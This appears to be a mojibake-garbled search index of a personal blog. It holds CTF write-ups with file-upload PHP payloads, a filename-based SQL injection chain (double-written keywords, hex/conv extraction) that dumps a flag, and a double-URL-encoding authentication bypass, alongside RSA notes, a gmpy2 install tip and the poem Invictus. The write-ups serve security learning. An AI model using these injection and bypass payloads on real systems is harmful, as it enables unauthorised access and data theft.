imageç„¶åæ”¹åç¼€ï¼› æ„é€ ï¼š 123&lt;ï¼Ÿphp phpinfo();ï¼Ÿ&gt; ä¸Šä¼ å‘ç°ï¼Œè¿‡æ»¤äº†;ä¸æ˜¯phpæ–‡ä»¶åˆä¸èƒ½è¿›è¡Œè§£æå¾—åˆ°å“åº”ï¼›éphpæ–‡ä»¶ä¸‹æç¤ºè¦ä¸Šä¼ phpæ–‡ä»¶ï¼›It is not a really php fileè¿™é‡Œå°è¯•ä½¿ç”¨phpçš„è„šæœ¬è¡¨è¾¾å½¢å¼ 123&lt;script language='php'&gt;phpinfo();&lt;/script&gt; å°†jpgåç¼€æ”¹ä¸ºphp4/php5;(å¦åˆ™ä¸èƒ½è§£æ)å°±å¾—åˆ°å“åº”flagäº†. uploadåˆæ¢ æ ¹æ®é¢˜ç›®uploadçŒœæµ‹å¯èƒ½ä¸ºæ–‡ä»¶ä¸Šä¼ æ¼æ´ï¼Œå…ˆæ³¨å†Œä¸ºä¼šå‘˜(username:111111;password:111111); ç™»å½•å°±å‡ºç°äº†ä¸Šä¼ æ–‡ä»¶çš„é¡µé¢å¦‚ä¸‹ï¼š å°è¯•ä¸Šä¼ æ–‡ä»¶ï¼Œå‘ç°åªæœ‰jpgæ ¼å¼çš„æ–‡ä»¶å¯ä»¥ä¸Šä¼ å°è¯•ä¸Šä¼ php.jpg 1&lt;?php echo phpinfo();?&gt; burpsuiteæŠ“åŒ…æ”¹åç¼€åä¸ºphpå¾—åˆ°ç»“æœå›åº”ä¸ºæ–‡ä»¶æ ¼å¼é”™è¯¯ï¼Œåº”è¯¥æ˜¯æœåŠ¡å™¨ç«¯çš„æ£€æŸ¥ï¼Œè€Œéå®¢æˆ·ç«¯Jsè¿‡æ»¤ï¼› åˆ†æï¼šé¢˜ç›®é™åˆ¶äº†ä¸Šä¼ æ–‡ä»¶çš„åç¼€åå¿…é¡»ä¸ºjpgï¼Œä½†å¹¶æ²¡æœ‰å¯¹æ–‡ä»¶å†…å®¹æœ‰æ‰€æ£€æŸ¥ï¼›å›¾ç‰‡é©¬çš„æ–¹æ³•ä¸å¯è¡Œï¼Œä¸Šä¼ æˆåŠŸåå¹¶æ²¡æœ‰ç›®å½•ï¼ŒåŒæ—¶æ— æ³•ä¸Šä¼ .htaccesså¯¹å›¾ç‰‡é©¬è§£æï¼› å‚é˜…ç›¸å…³èµ„æ–™å‘ç°ä¼¼ä¹æ˜¯åˆ©ç”¨æ–‡ä»¶åæ³¨å…¥ï¼Œå¹¶ä¸”é€šè¿‡æ¯æ¬¡ä¸Šä¼ æˆåŠŸåçš„å›æ˜¾uid is ï¼š1660 å¤§æ¦‚èƒ½å¤ŸçŒœæµ‹åº”è¯¥æ˜¯åˆ©ç”¨æ–‡ä»¶åå¯¹åç«¯æ•°æ®åº“è¿›è¡Œæ³¨å…¥ï¼›*åç«¯æ’å…¥è¯­å¥ï¼š 12INSERT INTO è¡¨åVALUESï¼ˆè¢«æ’å…¥æ–°è¡Œä¸­çš„å€¼ï¼‰ å®é™…æ“ä½œï¼š æ„é€ payloadï¼šï¼ˆæ–‡ä»¶åï¼‰1'+(select database())+'.jpg å¯ä»¥çœ‹åˆ°selectè¢«è¿‡æ»¤äº†ï¼Œå°è¯•åŒå†™ç»•è¿‡ï¼š 1'+(selselectect database())+'.jpg é¡µé¢å›æ˜¾å‡ä¸º0ï¼› å°è¯•è½¬æ¢æ ¼å¼ï¼šè½¬ä¸º16è¿›åˆ¶ï¼š1'+(selselectect hex(database()))+'.jpg é¡µé¢å›æ˜¾ä¸ºï¼š7765625 åˆ†æ(å›æ˜¾16è¿›åˆ¶ä¸ºçº¯æ•°å­—ï¼Œå¯èƒ½è¿‡æ»¤å­—æ¯ï¼›ä¸”å¯èƒ½å›æ˜¾ä½ä¸å…¨)è½¬10è¿›åˆ¶è¾“å‡º:1'+(selselectect conv(hex(database()),16,10))+'.jpg *MySQL CONVï¼ˆï¼‰å°†ä¸€ä¸ªæ•°å­—ä»ä¸€ä¸ªæ•°å­—åŸºæ•°ç³»ç»Ÿè½¬æ¢ä¸ºå¦ä¸€ä¸ªæ•°å­—åŸºæ•°ç³»ç»Ÿã€‚è½¬æ¢åï¼Œå‡½æ•°è¿”å›æ•°å­—çš„å­—ç¬¦ä¸²è¡¨ç¤ºå½¢å¼ã€‚å½“å®šä¹‰çš„å‚æ•°ä¸ºNULLæ—¶ï¼Œè¿”å›å€¼å°†ä¸ºNULLã€‚æœ€å°åŸºæ•°ä¸º2ï¼Œæœ€å¤§åŸºæ•°ä¸º36.å¦‚æœè¦è½¬æ¢çš„åŸºæ•°ä¸ºè´Ÿæ•°ï¼Œåˆ™è¯¥æ•°å­—è¢«è§†ä¸ºå¸¦ç¬¦å·æ•°ã€‚å¦åˆ™ï¼Œå®ƒè¢«è§†ä¸ºæœªç­¾åã€‚è¯¥å‡½æ•°å‡ºç°åœ¨MySQLç‰ˆæœ¬ï¼š5.6è¯­æ³•ï¼š 1CONV(N,from_base,to_base) é¡µé¢å›æ˜¾ä¸ºï¼š1.8446744073709552e19 åˆ†æ(å›æ˜¾ç§‘å­¦è®¡æ•°æ³•ï¼Œåº”è¯¥æ˜¯è¾“å‡ºä½æ•°è¿‡é•¿)ä½¿ç”¨substråˆ†å‰²è¾“å‡ºï¼š1'+(selselectect conv(substr(hex(database()),1,12),16,10))+'.jpg é¡µé¢å›æ˜¾ä¸ºï¼š131277325825392 è½¬16è¿›åˆ¶å†è½¬ä¸ºascll,å¾—åˆ°ï¼šweb_up123456789def changeascll(number): number=str(hex(number))[2:] s1=[number[i:(i+2)]for i in range(0,len(number),2)] s2=[int(i,16)for i in s1] s3=[chr(i)for i in s2] s=\"\".join(s3) print(s)changeascll(131277325825392) æå–ååŠéƒ¨åˆ†å­—ç¬¦ï¼š1819238756 1'+(selselectect conv(substr(hex(database()),13,12),16,10))+'.jpg å¾—åˆ°æ•°æ®åº“åï¼šweb_upload åŒæ ·ä½¿ç”¨ä¸Šè¿°æ–¹æ³•çˆ†è¡¨payloadï¼š1'+(selecselectt conv(substr(hex((selecselectt table_name frofromm information_schema.tables where table_schema='web_upload' limit 1,1)),1,12),16,10))+'.jpg 114784820031327112615676665705126853610566245å¾—åˆ°è¡¨åï¼šhello_flag_is_here çˆ†å­—æ®µpayload:1'+(selecselectt conv(substr(hex((selecselectt column_name frofromm information_schema.columns where table_name='hello_flag_is_here' limit 0,1)),1,12),16,10))+'.jpg 1158583773673987102823å¾—åˆ°å­—æ®µåï¼ši_am_flag çˆ†å€¼payloadï¼š1'+(selecselectt conv(substr(hex((selecselectt i_am_flag frofromm hello_flag_is_here limit 0,1)),1,12),16,10))+'.jpg 3642721569519992806431727430560750951 å¾—åˆ°å€¼ï¼š1!!_@m_Th.e_F!lag web2é¢˜ç›®åˆ†æï¼šæ ¹æ®é¢˜ç›®è¦æ±‚éœ€è¦è§£å¯†ï¼› 12345678910111213141516171819202122232425262728293031&lt;?php$miwen=\"a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws\";function encode($str)&#123; $_o=strrev($str);//strrev() å‡½æ•°åè½¬å­—ç¬¦ä¸²;è¯­æ³•:strrev(string) // echo $_o; for($_0=0;$_0&lt;strlen($_o);$_0++)&#123; $_c=substr($_o,$_0,1);//ä»$_0ä½ç½®å¼€å§‹ï¼Œè¿”å›1ä¸ªå­—ç¬¦//substr() å‡½æ•°è¿”å›å­—ç¬¦ä¸²çš„ä¸€éƒ¨åˆ†ã€‚//æ³¨é‡Šï¼šå¦‚æœ start å‚æ•°æ˜¯è´Ÿæ•°ä¸” length å°äºæˆ–ç­‰äº startï¼Œåˆ™ length ä¸º 0ã€‚è¯­æ³•substr(string,start,length)//ç”¨äºæå–å­—ç¬¦ä¸²çš„ä¸€éƒ¨åˆ†ï¼Œå³è¿”å›å­—ç¬¦ä¸²çš„å­ä¸²ã€‚ $__=ord($_c)+1;//ord() å‡½æ•°è¿”å›å­—ç¬¦ä¸²çš„é¦–ä¸ªå­—ç¬¦çš„ ASCII å€¼ã€‚ $_c=chr($__);//chr() å‡½æ•°ä»æŒ‡å®šçš„ ASCII å€¼è¿”å›å­—ç¬¦ã€‚//ASCII å€¼å¯è¢«æŒ‡å®šä¸ºåè¿›åˆ¶å€¼ã€å…«è¿›åˆ¶å€¼æˆ–åå…­è¿›åˆ¶å€¼ã€‚å…«è¿›åˆ¶å€¼è¢«å®šä¹‰ä¸ºå¸¦å‰ç½® 0ï¼Œè€Œåå…­è¿›åˆ¶å€¼è¢«å®šä¹‰ä¸ºå¸¦å‰ç½® 0xã€‚ $_=$_.$_c;//æ‹¼æ¥ &#125; return str_rot13(strrev(base64_encode($_)));//è¿”å›ROT13 ç¼–ç (åè½¬å­—ç¬¦ä¸²(base64åŠ å¯†($_)))çš„ç»“æœ//ROT13ä¸€ç§ç®€æ˜“çš„æ›¿æ¢å¼å¯†ç &#125;highlight_file(__FILE__);/* é€†å‘åŠ å¯†ç®—æ³•ï¼Œè§£å¯†$miwenå°±æ˜¯flag*/?&gt; å®é™…æ“ä½œï¼šåˆ†æä»£ç ï¼Œå¯çŸ¥åŠ å¯†æµç¨‹ä¸ºï¼š å¯¹flagå­—ç¬¦ä¸²åè½¬ æˆªå–æ¯ä¸€ä¸ªå­—ç¬¦ï¼Œè½¬ascll+1,å†è½¬ä¸ºå­—ç¬¦ï¼Œæ‹¼æ¥ base64åŠ å¯†ï¼Œåè½¬åŠ å¯†å’Œçš„å­—ç¬¦ä¸²ï¼ŒROT13ç¼–ç åˆ™å¯å¾—è§£å¯†ç®—æ³•ï¼š12345678910111213141516&lt;?php$str='a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws';$_ = base64_decode(strrev(str_rot13($str)));$_o=NULL;for($_0=0;$_0&lt;strlen($_);$_0++)&#123; $_c=substr($_,$_0,1); $__=ord($_c)-1; $_c=chr($__); $_o=$_o.$_c; &#125; echo strrev($_o);?&gt; php2é¢˜ç›®åˆ†æï¼šæ‰“å¼€é“¾æ¥åªæœ‰ä¸€å¥ï¼šCan you anthenticate to this website?å°è¯•è®¿é—®index.phpï¼Œå¤±è´¥ï¼›è®¿é—®index.phps,æˆåŠŸï¼›å¾—åˆ°ä»¥ä¸‹æºç ï¼š 12345678910111213&lt;?phpif(\"admin\"===$_GET[id]) &#123; echo(\"&lt;p&gt;not allowed!&lt;/p&gt;\"); exit();&#125;$_GET[id] = urldecode($_GET[id]);if($_GET[id] == \"admin\")&#123; echo \"&lt;p&gt;Access granted!&lt;/p&gt;\"; echo \"&lt;p&gt;Key: xxxxxxx &lt;/p&gt;\";&#125;?&gt; åˆ†æä»£ç ï¼š è¦ä½¿â€adminâ€===$_GET[id]ä¸æˆç«‹ $_GET[id] = urldecode($_GET[id]);urlç¼–ç åä½¿å¾—$_GET[id] == â€œadminâ€æˆç«‹ å®é™…æ“ä½œï¼šæ–¹æ¡ˆï¼šé€šè¿‡urlè½¬ç å®ç°ï¼Œå› ä¸ºæµè§ˆå™¨è¦è½¬ä¸€æ¬¡ï¼Œæ•…æˆ‘ä»¬è¿›è¡ŒäºŒæ¬¡è½¬ç ï¼›nçš„urlç¼–ç ä¸ºï¼š%6e;%çš„urlç¼–ç ä¸º%25æ„é€ ï¼šadmi%256e 1http://111.198.29.45:35463/?id=admi%256e","categories":[{"name":"CTF","slug":"CTF","permalink":"https://singlemindedt.github.io/categories/CTF/"},{"name":"æ”»é˜²ä¸–ç•Œ","slug":"CTF/æ”»é˜²ä¸–ç•Œ","permalink":"https://singlemindedt.github.io/categories/CTF/æ”»é˜²ä¸–ç•Œ/"}],"tags":[{"name":"Web","slug":"Web","permalink":"https://singlemindedt.github.io/tags/Web/"}]},{"title":"RSAç®—æ³•åˆ†æ","slug":"RSAç®—æ³•åˆ†æ","date":"2019-12-24T08:49:29.000Z","updated":"2019-12-24T09:17:40.535Z","comments":true,"path":"2019/12/24/RSAç®—æ³•åˆ†æ/","link":"","permalink":"https://singlemindedt.github.io/2019/12/24/RSAç®—æ³•åˆ†æ/","excerpt":"","text":"å¿«é€Ÿå¹‚ç®—æ³• åŠ è§£å¯†éƒ½ç”¨åˆ°äº†å¹‚è¿ç®— 1234567891011def FastMod(x, n, m): a = 1 b = x while True: temp = n if n % 2 == 1 : a = a * b % m b = b * b % m n = n//2 if temp &lt; 1 : return a ç”Ÿæˆnä½çš„ç´ æ•°äº§ç”Ÿçš„ç´ æ•°è¶Šå¤§ï¼Œå®‰å…¨æ€§è¶Šå¥½ 1234567891011def genPrime(b=1024): while True: # the highest bit is 1 ans = \"1\" for i in range(b-2): ans += str(random.randint(0,1)) # the lowest bit is 1 ans += \"1\" ans = int(ans,2) if miller_rabin(ans): return ans","categories":[],"tags":[]},{"title":"å®‰è£…gmpy2","slug":"å®‰è£…gmpy2","date":"2019-12-23T03:44:56.000Z","updated":"2019-12-23T23:40:15.006Z","comments":true,"path":"2019/12/23/å®‰è£…gmpy2/","link":"","permalink":"https://singlemindedt.github.io/2019/12/23/å®‰è£…gmpy2/","excerpt":"","text":"åœ¨Windowsä¸Šå®‰è£…éœ€è¦éå®˜æ–¹çš„é¢„ç¼–è¯‘äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œç½‘å€ï¼šhttps://www.lfd.uci.edu/~gohlke/pythonlibs/æ‰¾GMPYï¼Œæ˜¯æŒ‰ç…§å­—æ¯åºæ’çš„ï¼Œé€‰æ‹©é€‚åˆè‡ªå·±ç‰ˆæœ¬çš„gmpy2çš„whlæ–‡ä»¶è¿›è¡Œä¸‹è½½ï¼Œæˆ‘é€‰çš„ï¼šgmpy2â€‘2.0.8â€‘cp38â€‘cp38â€‘win_amd64.whlä¿å­˜åœ¨äº†Eç›˜ï¼Œå®‰è£…ï¼š PyCharmè¯»å–æœ¬åœ°åŒ…ï¼šå³å‡»pycharmä¸­é¡¹ç›®ç®¡ç†å™¨ä¸­æœ¬é¡¹ç›®ç›®å½•ä¸‹çš„venvæ–‡ä»¶å¤¹ï¼Œå•å‡»åœ¨èµ„æºç®¡ç†å™¨ä¸­æ‰“å¼€ï¼›ç”¨è®°äº‹æœ¬æ‰“å¼€pyvenv.cfgï¼Œå°†é‡Œé¢çš„include-system-site-packages = falseæ”¹ä¸ºinclude-system-site-packages = trueï¼›é‡å¯ï¼› æœ¬é¡¹ç›®æœ‰æ•ˆï¼Œå…¶å®ƒè¿˜å¾—æ”¹pyvenv.cfg","categories":[{"name":"notes","slug":"notes","permalink":"https://singlemindedt.github.io/categories/notes/"},{"name":"Python","slug":"notes/Python","permalink":"https://singlemindedt.github.io/categories/notes/Python/"}],"tags":[{"name":"Python","slug":"Python","permalink":"https://singlemindedt.github.io/tags/Python/"}]},{"title":"php2","slug":"php2","date":"2019-12-21T02:51:21.000Z","updated":"2019-12-30T06:10:07.045Z","comments":true,"path":"2019/12/21/php2/","link":"","permalink":"https://singlemindedt.github.io/2019/12/21/php2/","excerpt":"","text":"php2é¢˜ç›®åˆ†æï¼šæ‰“å¼€é“¾æ¥åªæœ‰ä¸€å¥ï¼šCan you anthenticate to this website?å°è¯•è®¿é—®index.phpï¼Œå¤±è´¥ï¼›è®¿é—®index.phps,æˆåŠŸï¼›å¾—åˆ°ä»¥ä¸‹æºç ï¼š 12345678910111213&lt;?phpif(\"admin\"===$_GET[id]) &#123; echo(\"&lt;p&gt;not allowed!&lt;/p&gt;\"); exit();&#125;$_GET[id] = urldecode($_GET[id]);if($_GET[id] == \"admin\")&#123; echo \"&lt;p&gt;Access granted!&lt;/p&gt;\"; echo \"&lt;p&gt;Key: xxxxxxx &lt;/p&gt;\";&#125;?&gt; åˆ†æä»£ç ï¼š è¦ä½¿â€adminâ€===$_GET[id]ä¸æˆç«‹ $_GET[id] = urldecode($_GET[id]);urlç¼–ç åä½¿å¾—$_GET[id] == â€œadminâ€æˆç«‹ å®é™…æ“ä½œï¼šæ–¹æ¡ˆï¼šé€šè¿‡urlè½¬ç å®ç°ï¼Œå› ä¸ºæµè§ˆå™¨è¦è½¬ä¸€æ¬¡ï¼Œæ•…æˆ‘ä»¬è¿›è¡ŒäºŒæ¬¡è½¬ç ï¼›nçš„urlç¼–ç ä¸ºï¼š%6e;%çš„urlç¼–ç ä¸º%25æ„é€ ï¼šadmi%256e 1http://111.198.29.45:35463/?id=admi%256e","categories":[{"name":"CTF","slug":"CTF","permalink":"https://singlemindedt.github.io/categories/CTF/"},{"name":"æ”»é˜²ä¸–ç•Œ","slug":"CTF/æ”»é˜²ä¸–ç•Œ","permalink":"https://singlemindedt.github.io/categories/CTF/æ”»é˜²ä¸–ç•Œ/"}],"tags":[{"name":"Web","slug":"Web","permalink":"https://singlemindedt.github.io/tags/Web/"}]},{"title":"web2","slug":"web2","date":"2019-12-21T01:44:24.000Z","updated":"2019-12-30T06:07:46.353Z","comments":true,"path":"2019/12/21/web2/","link":"","permalink":"https://singlemindedt.github.io/2019/12/21/web2/","excerpt":"","text":"web2é¢˜ç›®åˆ†æï¼šæ ¹æ®é¢˜ç›®è¦æ±‚éœ€è¦è§£å¯†ï¼› 12345678910111213141516171819202122232425262728293031&lt;?php$miwen=\"a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws\";function encode($str)&#123; $_o=strrev($str);//strrev() å‡½æ•°åè½¬å­—ç¬¦ä¸²;è¯­æ³•:strrev(string) // echo $_o; for($_0=0;$_0&lt;strlen($_o);$_0++)&#123; $_c=substr($_o,$_0,1);//ä»$_0ä½ç½®å¼€å§‹ï¼Œè¿”å›1ä¸ªå­—ç¬¦//substr() å‡½æ•°è¿”å›å­—ç¬¦ä¸²çš„ä¸€éƒ¨åˆ†ã€‚//æ³¨é‡Šï¼šå¦‚æœ start å‚æ•°æ˜¯è´Ÿæ•°ä¸” length å°äºæˆ–ç­‰äº startï¼Œåˆ™ length ä¸º 0ã€‚è¯­æ³•substr(string,start,length)//ç”¨äºæå–å­—ç¬¦ä¸²çš„ä¸€éƒ¨åˆ†ï¼Œå³è¿”å›å­—ç¬¦ä¸²çš„å­ä¸²ã€‚ $__=ord($_c)+1;//ord() å‡½æ•°è¿”å›å­—ç¬¦ä¸²çš„é¦–ä¸ªå­—ç¬¦çš„ ASCII å€¼ã€‚ $_c=chr($__);//chr() å‡½æ•°ä»æŒ‡å®šçš„ ASCII å€¼è¿”å›å­—ç¬¦ã€‚//ASCII å€¼å¯è¢«æŒ‡å®šä¸ºåè¿›åˆ¶å€¼ã€å…«è¿›åˆ¶å€¼æˆ–åå…­è¿›åˆ¶å€¼ã€‚å…«è¿›åˆ¶å€¼è¢«å®šä¹‰ä¸ºå¸¦å‰ç½® 0ï¼Œè€Œåå…­è¿›åˆ¶å€¼è¢«å®šä¹‰ä¸ºå¸¦å‰ç½® 0xã€‚ $_=$_.$_c;//æ‹¼æ¥ &#125; return str_rot13(strrev(base64_encode($_)));//è¿”å›ROT13 ç¼–ç (åè½¬å­—ç¬¦ä¸²(base64åŠ å¯†($_)))çš„ç»“æœ//ROT13ä¸€ç§ç®€æ˜“çš„æ›¿æ¢å¼å¯†ç &#125;highlight_file(__FILE__);/* é€†å‘åŠ å¯†ç®—æ³•ï¼Œè§£å¯†$miwenå°±æ˜¯flag*/?&gt; å®é™…æ“ä½œï¼šåˆ†æä»£ç ï¼Œå¯çŸ¥åŠ å¯†æµç¨‹ä¸ºï¼š å¯¹flagå­—ç¬¦ä¸²åè½¬ æˆªå–æ¯ä¸€ä¸ªå­—ç¬¦ï¼Œè½¬ascll+1,å†è½¬ä¸ºå­—ç¬¦ï¼Œæ‹¼æ¥ base64åŠ å¯†ï¼Œåè½¬åŠ å¯†å’Œçš„å­—ç¬¦ä¸²ï¼ŒROT13ç¼–ç åˆ™å¯å¾—è§£å¯†ç®—æ³•ï¼š12345678910111213141516&lt;?php$str='a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws';$_ = base64_decode(strrev(str_rot13($str)));$_o=NULL;for($_0=0;$_0&lt;strlen($_);$_0++)&#123; $_c=substr($_,$_0,1); $__=ord($_c)-1; $_c=chr($__); $_o=$_o.$_c; &#125; echo strrev($_o);?&gt;","categories":[{"name":"CTF","slug":"CTF","permalink":"https://singlemindedt.github.io/categories/CTF/"},{"name":"æ”»é˜²ä¸–ç•Œ","slug":"CTF/æ”»é˜²ä¸–ç•Œ","permalink":"https://singlemindedt.github.io/categories/CTF/æ”»é˜²ä¸–ç•Œ/"}],"tags":[{"name":"Web","slug":"Web","permalink":"https://singlemindedt.github.io/tags/Web/"}]},{"title":"ä¸å¯å¾æœ","slug":"ä¸å¯å¾æœ","date":"2019-12-20T13:38:09.000Z","updated":"2019-12-20T14:20:49.046Z","comments":true,"path":"2019/12/20/ä¸å¯å¾æœ/","link":"","permalink":"https://singlemindedt.github.io/2019/12/20/ä¸å¯å¾æœ/","excerpt":"","text":"ã€Šä¸å¯å¾æœã€‹ ä½œè€…ï¼šå¨å»‰äº¨åˆ© é€è¿‡è¦†ç›–æˆ‘çš„å¤œè‰², æˆ‘çœ‹è§é»‘æš—å±‚å±‚å å ã€‚ æˆ‘æ„Ÿè°¢ä¸Šå¤©èµäºˆæˆ‘, ä¸å¯å¾æœçš„çµé­‚ã€‚ å°±ç®—è¢«åœ°ç‹±ç´§ç´§æ‹½ä½, æˆ‘ä¹Ÿä»æœªé€€é¿å“€æ±‚ã€‚ é­å—å‘½è¿çš„é‡é‡æ‰“å‡»ï¼Œ æˆ‘æ»¡å¤´é²œè¡€ï¼Œå´å¤´é¢…é«˜æ˜‚ã€‚ åœ¨æ„¤æ€’å’Œæ‚²ä¼¤çš„å°˜ä¸–å¤–, è€¸ç«‹çš„ä¸è¿‡æ˜¯ææ€–çš„å½±å­, é¢å¯¹æœªæ¥çš„å¨èƒ, æˆ‘æ— æ‰€ç•æƒ§ã€‚ æ— è®ºå‘½è¿ä¹‹é—¨å¤šä¹ˆç‹­çª„ï¼Œ æ— è®ºæ‰¿å—æ€æ ·çš„æƒ©ç½šï¼Œ æˆ‘æ˜¯æˆ‘å‘½è¿çš„ä¸»å®°, æˆ‘æ˜¯æˆ‘çµé­‚çš„ç»Ÿå¸…ã€‚ Invictus Out of the night that covers me Black as the pit from pole to pole I thank whatever gods may be For my unconquerable soul In the fell clutch of circumstance I have not winced nor cried aloud Under the bludgeonings of chance My head is bloody,but unbowed. Beyond this place of wrath and tear Looms but the Horror of the shade And yet the menace of the years Finds,and shall find,me unafraid It matters not how strait the gate How charged with punishments the scroll I am the master of my fate I am the captain of my soul.","categories":[{"name":"essay","slug":"essay","permalink":"https://singlemindedt.github.io/categories/essay/"}],"tags":[{"name":"essay","slug":"essay","permalink":"https://singlemindedt.github.io/tags/essay/"}]},{"title":"å…¬é’¥å¯†ç ä½“åˆ¶","slug":"å…¬é’¥å¯†ç ä½“åˆ¶","date":"2019-12-19T08:15:45.000Z","updated":"2020-01-01T16:44:00.645Z","comments":true,"path":"2019/12/19/å…¬é’¥å¯†ç ä½“åˆ¶/","link":"","permalink":"https://singlemindedt.github.io/2019/12/19/å…¬é’¥å¯†ç ä½“åˆ¶/","excerpt":"","text":"åŸå› å¯¹ç§°åŠ å¯†ä½“åˆ¶çš„ä¸è¶³ï¼š å¯†é’¥çš„åˆ†é…å’Œç®¡ç† ç­¾åå’Œè®¤è¯ å…¬é’¥åŠ å¯†ä½“åˆ¶1.å‘é€æ–¹AæŸ¥æ‰¾æ¥æ”¶æ–¹Bçš„å…¬é’¥ Aé‡‡ç”¨å…¬é’¥åŠ å¯†ç®—æ³•ä»¥Bçš„å…¬é’¥åŠ å¯†æ˜æ–‡æ¶ˆæ¯ Aé€šè¿‡ä¸å®‰å…¨ä¿¡é“å°†å¯†æ–‡å‘é€ç»™B Bæ”¶åˆ°å¯†æ–‡åç”¨è‡ªå·±çš„ç§é’¥è§£å¯†è·å–æ˜æ–‡ å…³é”®ï¼šå•å‘é™·é—¨å‡½æ•°å•å‘é™·é—¨å‡½æ•°ğ’‡ï¼š ç»™å‡ºğ‘“å®šä¹‰åŸŸä¸­çš„ä»»æ„å…ƒç´ ğ‘¥,è®¡ç®—ğ‘“(ğ‘¥)æ˜¯å®¹æ˜“çš„ ç»™å‡ºğ‘¦=ğ‘“(ğ‘¥)ä¸­çš„ğ‘¦ï¼Œè®¡ç®—ğ‘¥ï¼š è‹¥çŸ¥é“è®¾è®¡å‡½æ•°ğ‘“æ—¶ç»“åˆè¿›å»çš„æŸç§ä¿¡æ¯ï¼ˆç§°ä¸ºé™·é—¨ï¼‰ï¼Œåˆ™ğ‘¥å®¹æ˜“è®¡ç®—ï¼› è‹¥ä¸çŸ¥é“è¯¥é™·é—¨ä¿¡æ¯ï¼Œåˆ™ğ‘¥éš¾ä»¥è®¡ç®—ä¸€ä¸ªå…¬é’¥å¯†ç åº”æ»¡è¶³ï¼š è§£å¯†ç®—æ³•Dä¸åŠ å¯†ç®—æ³•Eäº’é€†ï¼Œå³å¯¹äºæ‰€æœ‰æ˜æ–‡ğ‘€éƒ½æœ‰ï¼Œğ‘«(ğ‘¬(ğ‘´,ğ‘²ğ’†),ğ‘²ğ’…)ï¼ğ‘´ ç”±ğ¾ğ‘’æ±‚å‡ºğ¾ğ‘‘åœ¨è®¡ç®—ä¸Šä¸å¯è¡Œ ç®—æ³•Eå’ŒDéƒ½æ˜¯é«˜æ•ˆçš„ RSAå®‰å…¨æ€§åŸºäºå¤§æ•´æ•°å› å­åˆ†è§£çš„å›°éš¾æ€§ RSAç®—æ³•æè¿° ä¾‹å­ ç´ æ•°çš„ç”Ÿæˆä¸€èˆ¬çš„ï¼Œé€‰å–ä¸€ä¸ªç´ æ•°çš„è¿‡ç¨‹å¦‚ä¸‹ï¼š éšæœºé€‰ä¸€ä¸ªå¥‡æ•°ğ‘›(å¦‚ä½¿ç”¨ä¼ªéšæœºæ•°äº§ç”Ÿå™¨) ç”¨æŸç§æ¦‚ç‡æ€§ç®—æ³•ï¼ˆå¦‚Miller-Rabinç®—æ³•ï¼‰å¯¹nè¿›è¡Œä¸€æ¬¡ç´ æ€§æ£€éªŒï¼Œå¦‚æœğ‘›æ²¡æœ‰é€šè¿‡æ£€éªŒï¼Œè½¬åˆ°æ­¥éª¤1 é‡å¤æ­¥éª¤2è¶³å¤Ÿå¤šæ¬¡ï¼Œå¦‚æœğ‘›éƒ½é€šè¿‡äº†æ£€æµ‹ï¼Œåˆ™è®¤ä¸ºğ‘›ä¸ºç´ æ•°RSAçš„å®ç° ä¾‹å­ RSAçš„å®‰å…¨æ€§ ä¿å¯†p,qå·²çŸ¥p,q,ç”±Eulerå‡½æ•°Ï†(ğ‘›)=(ğ‘âˆ’1)(ğ‘âˆ’1)ï¼Œä¹Ÿå°±å¯ä»¥åˆ©ç”¨æ¬§å‡ é‡Œå¾—é™¤æ³•ï¼Œæ ¹æ®ğ‘’ğ‘‘â‰¡1 (ğ‘šğ‘œğ‘‘ Ï†(ğ‘›)), ç”±ğ‘’æ±‚å‡ºğ‘‘ ä¾èµ–äºå¤§æ•°åˆ†è§£é—®é¢˜ å¯¹RSAçš„æ”»å‡»* é’ˆå¯¹ğ’åˆ†è§£çš„æ”»å‡» å¾ªç¯æ”»å‡» åŒæ¨¡æ”»å‡» é€‰æ‹©å¯†æ–‡æ”»å‡» ä½åŠ å¯†æŒ‡æ•°æ”»å‡» æ—¶é—´æ”»å‡» ä½¿ç”¨RSAä½“åˆ¶æ—¶å¿…é¡»æ³¨æ„é—®é¢˜ï¼š é€‰æ‹©ç´ æ•°ğ‘å’Œğ‘æ—¶ï¼Œåº”ä½¿å…¶æ¬§æ‹‰å‡½æ•°Ï†(ğ‘)å’ŒÏ†(ğ‘)çš„æœ€å°å…¬å€æ•°å°½å¯èƒ½å¤§(Ï†(ğ’‘)å’ŒÏ†(ğ’’) æœ‰å¤§çš„ç´ å› å­)ã€‚æœ€å°å…¬å€æ•°è¶Šå¤§ï¼Œå¹‚å‰©ä½™å‡½æ•°çš„å‘¨æœŸå°±è¶Šé•¿â€”é¿å…å¾ªç¯æ”»å‡» å¯†é’¥ä¸­çš„å„é¡¹å‚æ•°åº”é€‰å¾—è¶³å¤Ÿå¤§â€”é¿å…ç©·ä¸¾æ”»å‡» åœ¨åŒä¸€ä¸ªé€šä¿¡ç½‘ç»œä¸­ï¼Œä¸åŒçš„ç”¨æˆ·ä¸åº”è¯¥ä½¿ç”¨å…±åŒçš„æ¨¡æ•°nâ€”é¿å…åŒæ¨¡æ”»å‡» å…¬é’¥å¯†ç ä½“åˆ¶ElGamalåŸºäºç¦»æ•£å¯¹æ•°é—®é¢˜ ç®—æ³•æè¿°1.å¯†é’¥ç”Ÿæˆé€‰å–å¤§ç´ æ•°ğ‘ï¼Œğ‘”âˆˆã€–ğ‘_ğ‘ã€—^âˆ—æ˜¯ä¸€ä¸ªç”Ÿæˆå…ƒï¼Œğ‘,ğ‘” ä½œä¸ºç³»ç»Ÿå‚æ•°æ‰€æœ‰ç”¨æˆ·å…±äº« ç³»ç»Ÿä¸­æ¯ä¸ªç”¨æˆ·Uéƒ½éšæœºæŒ‘é€‰æ•´æ•°ğ‘¥ï¼Œ2â‰¤ğ‘¥â‰¤ ğ‘ï¼2ï¼Œå¹¶è®¡ç®—ï¼š ğ‘¦=ğ‘”^ğ‘¥(ğ‘šğ‘œğ‘‘ ğ‘)ï¼Œ ğ‘¦ä½œä¸ºç”¨æˆ·Uçš„å…¬é’¥ï¼Œè€Œğ‘¥ä½œä¸ºç”¨æˆ·Uçš„ç§é’¥ 2.åŠ å¯† 